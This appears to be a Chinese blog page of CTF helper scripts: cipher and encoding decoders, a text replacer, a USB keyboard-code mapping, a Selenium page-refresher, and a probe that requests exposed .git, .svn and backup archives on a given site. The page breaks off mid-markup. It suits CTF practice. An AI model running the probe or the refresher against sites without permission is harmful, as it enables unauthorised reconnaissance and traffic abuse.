<h2 id="将十六进制错位转ascil输出"><a href="#将十六进制错位转ascil输出" class="headerlink" title="将十六进制错位转ascil输出"></a>将十六进制错位转ascil输出</h2><p>做题时发现的脚本,存一下说不定以后有用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io  </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"></span><br><span class="line"><span class="comment">#改变标准输出的默认编码 </span></span><br><span class="line"><span class="comment">#utf-8中文乱码</span></span><br><span class="line">sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">s = [<span class="number">0x4c</span>,<span class="number">0xa6</span>,<span class="number">0x49</span>,<span class="number">0x24</span>,<span class="number">0xa5</span>,<span class="number">0x18</span>,<span class="number">0x54</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x14</span>,<span class="number">0x80</span>,<span class="number">0xd1</span>,<span class="number">0x49</span>,<span class="number">0x92</span>,<span class="number">0xc4</span>,<span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0x15</span>,<span class="number">0x38</span>,<span class="number">0x62</span>,<span class="number">0x40</span>,<span class="number">0x4d</span>,<span class="number">0x50</span>,<span class="number">0x94</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x92</span>,<span class="number">0x84</span>,<span class="number">0x41</span>,<span class="number">0x45</span>,<span class="number">0xc9</span>,<span class="number">0x41</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x52</span>,<span class="number">0x5c</span>,<span class="number">0xa6</span>,<span class="number">0x45</span>,<span class="number">0x50</span>,<span class="number">0xa3</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,</span><br><span class="line"><span class="number">0x83</span>,<span class="number">0x13</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">160</span>):</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        flag+=chr(s[j]-i)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="解摩斯密码"><a href="#解摩斯密码" class="headerlink" title="解摩斯密码"></a>解摩斯密码</h2><p>只能输出大写字母,后续再添加功能,更新了所有的符号<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">a =<span class="string">".-....-.--.---.-.-.-..-......-........-..---..--.-"</span></span><br><span class="line">s = a.split(<span class="string">"/"</span>)</span><br><span class="line">dict = &#123;<span class="string">'.-'</span>: <span class="string">'A'</span>,</span><br><span class="line">        <span class="string">'-...'</span>: <span class="string">'B'</span>,</span><br><span class="line">        <span class="string">'-.-.'</span>: <span class="string">'C'</span>,</span><br><span class="line">        <span class="string">'-..'</span>:<span class="string">'D'</span>,</span><br><span class="line">        <span class="string">'.'</span>:<span class="string">'E'</span>,</span><br><span class="line">        <span class="string">'..-.'</span>:<span class="string">'F'</span>,</span><br><span class="line">        <span class="string">'--.'</span>: <span class="string">'G'</span>,</span><br><span class="line">        <span class="string">'....'</span>: <span class="string">'H'</span>,</span><br><span class="line">        <span class="string">'..'</span>: <span class="string">'I'</span>,</span><br><span class="line">        <span class="string">'.---'</span>:<span class="string">'J'</span>,</span><br><span class="line">        <span class="string">'-.-'</span>: <span class="string">'K'</span>,</span><br><span class="line">        <span class="string">'.-..'</span>: <span class="string">'L'</span>,</span><br><span class="line">        <span class="string">'--'</span>: <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'-.'</span>: <span class="string">'N'</span>,</span><br><span class="line">        <span class="string">'---'</span>: <span class="string">'O'</span>,</span><br><span class="line">        <span class="string">'.--.'</span>: <span class="string">'P'</span>,</span><br><span class="line">        <span class="string">'--.-'</span>: <span class="string">'Q'</span>,</span><br><span class="line">        <span class="string">'.-.'</span>: <span class="string">'R'</span>,</span><br><span class="line">        <span class="string">'...'</span>: <span class="string">'S'</span>,</span><br><span class="line">        <span class="string">'-'</span>: <span class="string">'T'</span>,</span><br><span class="line">        <span class="string">'..-'</span>: <span class="string">'U'</span>,</span><br><span class="line">        <span class="string">'...-'</span>: <span class="string">'V'</span>,</span><br><span class="line">        <span class="string">'.--'</span>: <span class="string">'W'</span>,</span><br><span class="line">        <span class="string">'-..-'</span>: <span class="string">'X'</span>,</span><br><span class="line">        <span class="string">'-.--'</span>: <span class="string">'Y'</span>,</span><br><span class="line">        <span class="string">'--..'</span>: <span class="string">'Z'</span>,</span><br><span class="line">        <span class="string">'.----'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'..---'</span>: <span class="string">'2'</span>,</span><br><span class="line">        <span class="string">'...--'</span>: <span class="string">'3'</span>,</span><br><span class="line">        <span class="string">'....-'</span>: <span class="string">'4'</span>,</span><br><span class="line">        <span class="string">'.....'</span>: <span class="string">'5'</span>,</span><br><span class="line">        <span class="string">'-....'</span>: <span class="string">'6'</span>,</span><br><span class="line">        <span class="string">'--...'</span>: <span class="string">'7'</span>,</span><br><span class="line">        <span class="string">'---..'</span>: <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'----.'</span>: <span class="string">'9'</span>,</span><br><span class="line">        <span class="string">'-----'</span>: <span class="string">'0'</span>,</span><br><span class="line">        <span class="string">'.-.-.-'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'..--..'</span>: <span class="string">'?'</span>,</span><br><span class="line">        <span class="string">'-.-.--'</span>: <span class="string">'!'</span>,</span><br><span class="line">        <span class="string">'-..-.'</span>: <span class="string">'/'</span>,</span><br><span class="line">        <span class="string">'.--.-.'</span>: <span class="string">'@'</span>,</span><br><span class="line">        <span class="string">'---...'</span>: <span class="string">':'</span>,</span><br><span class="line">        <span class="string">'-.--.'</span>: <span class="string">'('</span>,</span><br><span class="line">        <span class="string">'-.--.-'</span>: <span class="string">')'</span>,</span><br><span class="line">        <span class="string">'-....-'</span>: <span class="string">'-'</span>,</span><br><span class="line">        <span class="string">'.-.-.-'</span>: <span class="string">'.'</span>,</span><br><span class="line">        <span class="string">'----.--'</span>: <span class="string">'&#123;'</span>,</span><br><span class="line">        <span class="string">'-----.-'</span>: <span class="string">'&#125;'</span>,</span><br><span class="line">        <span class="string">'-....-'</span>: <span class="string">'='</span>,</span><br><span class="line">        <span class="string">'.----.'</span>: <span class="string">'\''</span>,</span><br><span class="line">        <span class="string">'..--.-'</span>: <span class="string">'_'</span>,</span><br><span class="line">        <span class="string">'...-..-'</span>: <span class="string">'$'</span>,</span><br><span class="line">        <span class="string">'-.-.-.'</span>: <span class="string">';'</span>,</span><br><span class="line">        <span class="string">'.-..-.'</span>: <span class="string">'"'</span>,</span><br><span class="line">        <span class="string">'. ...'</span>: <span class="string">'&amp;'</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">print</span> (dict[item],end=<span class="string">''</span>)</span><br><span class="line"><span class="comment">#print (s)</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="批量替换txt里字符"><a href="#批量替换txt里字符" class="headerlink" title="批量替换txt里字符"></a>批量替换txt里字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.chdir(<span class="string">'C:\\Users\\Administrator\\Downloads'</span>) <span class="comment"># 跳到某盘</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'as_code.txt'</span>): <span class="comment"># 看一下这个文件是否存在</span></span><br><span class="line">    exit(<span class="number">-1</span>) <span class="comment">#，不存在就退出</span></span><br><span class="line">lines = open(<span class="string">'as_code.txt'</span>).readlines() <span class="comment">#打开文件，读入每一行</span></span><br><span class="line">fp = open(<span class="string">'as_code1.txt'</span>,<span class="string">'w'</span>) <span class="comment">#打开你要写的文件,不存在则创建</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> lines:</span><br><span class="line">    fp.write( s.replace(<span class="string">'s'</span>,<span class="string">'0'</span>).replace(<span class="string">'a'</span>,<span class="string">'1'</span>)) <span class="comment"># replace是替换，write是写入</span></span><br><span class="line">    fp.close() <span class="comment"># 关闭文件</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web源码泄露探测"><a href="#web源码泄露探测" class="headerlink" title="web源码泄露探测"></a>web源码泄露探测</h2><p>用来探测一些常见的源码泄露<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">lists = [<span class="string">'/.git/config'</span>, <span class="string">'/.svn/entries'</span>, <span class="string">'web.rar'</span>, <span class="string">'www.zip'</span>, <span class="string">'www.rar'</span>, <span class="string">'wwwroot.rar'</span>, <span class="string">'1.rar'</span>, <span class="string">'bbs.zip'</span>, <span class="string">'website.rar'</span>]</span><br><span class="line">print(<span class="string">'- - - - - - - - - - - - - - - - - - - -'</span>)</span><br><span class="line">print(<span class="string">u'|    就是个自己用的小脚本 by Damya   |'</span>)</span><br><span class="line">print(<span class="string">'- - - - - - - - - - - - - - - - - - - -'</span>)</span><br><span class="line"><span class="comment"># 用来输入需要探测的网址</span></span><br><span class="line">address = input(<span class="string">'请输入URL地址：'</span>)</span><br><span class="line"><span class="comment"># 把列表里的元素一个一个遍历出来</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="comment"># 把网址和探测的文件连接到一起</span></span><br><span class="line">    tance = <span class="string">"%s/%s"</span> % (address, a)</span><br><span class="line">    <span class="comment"># print tance   </span></span><br><span class="line">    <span class="comment"># 使用 request 模块里的 get 来获取这个网址</span></span><br><span class="line">    qq = requests.get(url=tance)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取响应码并赋值给 dq</span></span><br><span class="line">    dq = qq.status_code</span><br><span class="line">    <span class="comment"># 判断响应码是否为 200 ，是，就进行下一步</span></span><br><span class="line">    <span class="keyword">if</span> dq == <span class="number">200</span> :</span><br><span class="line">        <span class="comment"># 输出 响应码和探测地址</span></span><br><span class="line">        print(<span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance))</span><br><span class="line">    <span class="comment"># 如果响应码不是 200 就进行着一步</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 输入响应码和地址</span></span><br><span class="line">        print(<span class="string">u"响应码：[%s]  -  地址：%s"</span> % (dq, tance))</span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="模拟自动刷新脚本"><a href="#模拟自动刷新脚本" class="headerlink" title="模拟自动刷新脚本"></a>模拟自动刷新脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refresh</span><span class="params">(url,num)</span>:</span></span><br><span class="line">    driver = webdriver.Chrome(<span class="string">"C:/python27/chromedriver.exe"</span>)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">        driver.refresh()</span><br><span class="line">    print(<span class="string">'Browser will be close after 600s'</span>)</span><br><span class="line">    time.sleep(<span class="number">600</span>)</span><br><span class="line">    driver.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = input(<span class="string">"Please enter the url:\n"</span>)</span><br><span class="line">    num = int(input(<span class="string">"Enter the number of refresh:\n"</span>))</span><br><span class="line">    refresh(url,num)</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="培根密码解密脚本"><a href="#培根密码解密脚本" class="headerlink" title="培根密码解密脚本"></a>培根密码解密脚本</h2><p>包含两种解法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>]</span><br><span class="line"></span><br><span class="line">first_cipher = [<span class="string">"aaaaa"</span>,<span class="string">"aaaab"</span>,<span class="string">"aaaba"</span>,<span class="string">"aaabb"</span>,<span class="string">"aabaa"</span>,<span class="string">"aabab"</span>,<span class="string">"aabba"</span>,<span class="string">"aabbb"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaab"</span>,<span class="string">"ababa"</span>,<span class="string">"ababb"</span>,<span class="string">"abbaa"</span>,<span class="string">"abbab"</span>,<span class="string">"abbba"</span>,<span class="string">"abbbb"</span>,<span class="string">"baaaa"</span>,<span class="string">"baaab"</span>,<span class="string">"baaba"</span>,<span class="string">"baabb"</span>,<span class="string">"babaa"</span>,<span class="string">"babab"</span>,<span class="string">"babba"</span>,<span class="string">"babbb"</span>,<span class="string">"bbaaa"</span>,<span class="string">"bbaab"</span>]</span><br><span class="line"></span><br><span class="line">second_cipher = [<span class="string">"aaaaa"</span>,<span class="string">"aaaab"</span>,<span class="string">"aaaba"</span>,<span class="string">"aaabb"</span>,<span class="string">"aabaa"</span>,<span class="string">"aabab"</span>,<span class="string">"aabba"</span>,<span class="string">"aabbb"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaaa"</span>,<span class="string">"abaab"</span>,<span class="string">"ababa"</span>,<span class="string">"ababb"</span>,<span class="string">"abbaa"</span>,<span class="string">"abbab"</span>,<span class="string">"abbba"</span>,<span class="string">"abbbb"</span>,<span class="string">"baaaa"</span>,<span class="string">"baaab"</span>,<span class="string">"baaba"</span>,<span class="string">"baabb"</span>,<span class="string">"baabb"</span>,<span class="string">"babaa"</span>,<span class="string">"babab"</span>,<span class="string">"babba"</span>,<span class="string">"babbb"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    upper_flag = <span class="literal">False</span> <span class="comment"># 用于判断输入是否为大写</span></span><br><span class="line">    string = raw_input(<span class="string">"please input string to encode:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> string.isupper():</span><br><span class="line">        upper_flag = <span class="literal">True</span></span><br><span class="line">        string = string.lower()</span><br><span class="line">    e_string1 = <span class="string">""</span></span><br><span class="line">    e_string2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> index == alphabet[i]:</span><br><span class="line">                e_string1 += first_cipher[i]</span><br><span class="line">                e_string2 += second_cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> upper_flag:</span><br><span class="line">        e_string1 = e_string1.upper()</span><br><span class="line">        e_string2 = e_string2.upper()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"first encode method result is:\n"</span>+e_string1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"second encode method result is:\n"</span>+e_string2</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    upper_flag = <span class="literal">False</span>  <span class="comment"># 用于判断输入是否为大写</span></span><br><span class="line">    e_string = raw_input(<span class="string">"please input string to decode:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> e_string.isupper():</span><br><span class="line">        upper_flag = <span class="literal">True</span></span><br><span class="line">        e_string = e_string.lower()</span><br><span class="line">    e_array = re.findall(<span class="string">".&#123;5&#125;"</span>,e_string)</span><br><span class="line">    d_string1 = <span class="string">""</span></span><br><span class="line">    d_string2 = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> e_array:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> index == first_cipher[i]:</span><br><span class="line">                d_string1 += alphabet[i]</span><br><span class="line">            <span class="keyword">if</span> index == second_cipher[i]:</span><br><span class="line">                d_string2 += alphabet[i]</span><br><span class="line">    <span class="keyword">if</span> upper_flag:</span><br><span class="line">        d_string1 = d_string1.upper()</span><br><span class="line">        d_string2 = d_string2.upper()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"first decode method result is:\n"</span>+d_string1</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"second decode method result is:\n"</span>+d_string2</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\t\tcoding by qux"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\t*******Bacon Encode_Decode System*******"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"input should be only lowercase or uppercase,cipher just include a,b(or A,B)"</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"1.encode\n2.decode\n3.exit"</span></span><br><span class="line">        s_number = raw_input(<span class="string">"please input number to choose\n"</span>)</span><br><span class="line">        <span class="keyword">if</span> s_number == <span class="string">"1"</span>:</span><br><span class="line">            encode()</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">elif</span> s_number == <span class="string">"2"</span>:</span><br><span class="line">            decode()</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">elif</span> s_number == <span class="string">"3"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p>
<hr>
<h2 id="敲击码转换脚本"><a href="#敲击码转换脚本" class="headerlink" title="敲击码转换脚本"></a>敲击码转换脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">"A"</span>,  <span class="number">0x05</span>:<span class="string">"B"</span>,  <span class="number">0x06</span>:<span class="string">"C"</span>, <span class="number">0x07</span>:<span class="string">"D"</span>, <span class="number">0x08</span>:<span class="string">"E"</span>, <span class="number">0x09</span>:<span class="string">"F"</span>, <span class="number">0x0A</span>:<span class="string">"G"</span>,  <span class="number">0x0B</span>:<span class="string">"H"</span>, <span class="number">0x0C</span>:<span class="string">"I"</span>,  <span class="number">0x0D</span>:<span class="string">"J"</span>, <span class="number">0x0E</span>:<span class="string">"K"</span>, <span class="number">0x0F</span>:<span class="string">"L"</span>, <span class="number">0x10</span>:<span class="string">"M"</span>, <span class="number">0x11</span>:<span class="string">"N"</span>,<span class="number">0x12</span>:<span class="string">"O"</span>,  <span class="number">0x13</span>:<span class="string">"P"</span>, <span class="number">0x14</span>:<span class="string">"Q"</span>, <span class="number">0x15</span>:<span class="string">"R"</span>, <span class="number">0x16</span>:<span class="string">"S"</span>, <span class="number">0x17</span>:<span class="string">"T"</span>, <span class="number">0x18</span>:<span class="string">"U"</span>,<span class="number">0x19</span>:<span class="string">"V"</span>, <span class="number">0x1A</span>:<span class="string">"W"</span>, <span class="number">0x1B</span>:<span class="string">"X"</span>, <span class="number">0x1C</span>:<span class="string">"Y"</span>, <span class="number">0x1D</span>:<span class="string">"Z"</span>, <span class="number">0x1E</span>:<span class="string">"1"</span>, <span class="number">0x1F</span>:<span class="string">"2"</span>, <span class="number">0x20</span>:<span class="string">"3"</span>, <span class="number">0x21</span>:<span class="string">"4"</span>, <span class="number">0x22</span>:<span class="string">"5"</span>,  <span class="number">0x23</span>:<span class="string">"6"</span>, <span class="number">0x24</span>:<span class="string">"7"</span>, <span class="number">0x25</span>:<span class="string">"8"</span>, <span class="number">0x26</span>:<span class="string">"9"</span>, <span class="number">0x27</span>:<span class="string">"0"</span>, <span class="number">0x28</span>:<span class="string">"\n"</span>, <span class="number">0x2a</span>:<span class="string">"[DEL]"</span>,  <span class="number">0X2B</span>:<span class="string">"    "</span>, <span class="number">0x2C</span>:<span class="string">" "</span>,  <span class="number">0x2D</span>:<span class="string">"-"</span>, <span class="number">0x2E</span>:<span class="string">"="</span>, <span class="number">0x2F</span>:<span class="string">"["</span>,  <span class="number">0x30</span>:<span class="string">"]"</span>,  <span class="number">0x31</span>:<span class="string">"\\"</span>,  <span class="number">0x32</span>:<span class="string">"~"</span>, <span class="number">0x33</span>:<span class="string">";"</span>,  <span class="number">0x34</span>:<span class="string">"'"</span>, <span class="number">0x36</span>:<span class="string">","</span>,  <span class="number">0x37</span>:<span class="string">"."</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="string">"""00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:17:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:17:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0b:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0c:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:0c:16:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:0c:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:16:00:00:00:00:00</span></span><br><span class="line"><span class="string">00:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:00:00:00:00:00:00</span></span><br><span class="line"><span class="string">20:00:10:00:00:00:00:00</span></span><br><span class="line"><span 